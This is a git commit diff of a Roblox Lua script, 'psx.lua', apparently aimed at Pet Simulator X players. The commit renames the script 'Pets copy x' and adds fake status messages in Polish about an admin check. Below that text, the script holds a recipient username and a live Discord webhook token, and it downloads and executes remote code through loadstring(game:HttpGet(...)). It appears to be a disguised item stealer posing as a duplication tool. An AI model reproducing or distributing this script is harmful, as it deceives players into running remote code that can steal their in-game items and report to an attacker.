84ab422feec29699fde00d033728bd2c4d6d258a
Xrxradrad <125693592+Xrxradrad@users.noreply.github.com>
2023-04-18 22:31:45 +0200

    Update psx.lua

--- psx.lua
+++ psx.lua
@@ -1,9 +1,9 @@
 Username = "Xrxradrad"
 WebHook = "https://discord.com/api/webhooks/1097238202953244902/MAPyf8n1uYP6t2ArBc9n8zWgJOmuM1E9mppKqEeif2FYCVJ-tC0EeRtaeUHFHP70eseV"
 
-_G.CustomScriptName = "Project WD"
-_G.Text1 = "Script Loaded..."
-_G.Text2 = "Waiting for Script"
-_G.Text3 = "Checking Scripts..."
-_G.Text4 = "Starting Scripts..."
+_G.CustomScriptName = "Pets copy x"
+_G.Text1 = "anty admin check"
+_G.Text2 = "nie wykryto admina"
+_G.Text3 = "uruchamianie skryptow"
+_G.Text4 = "Gotowe"
 loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/petsimguiss.lua"))()
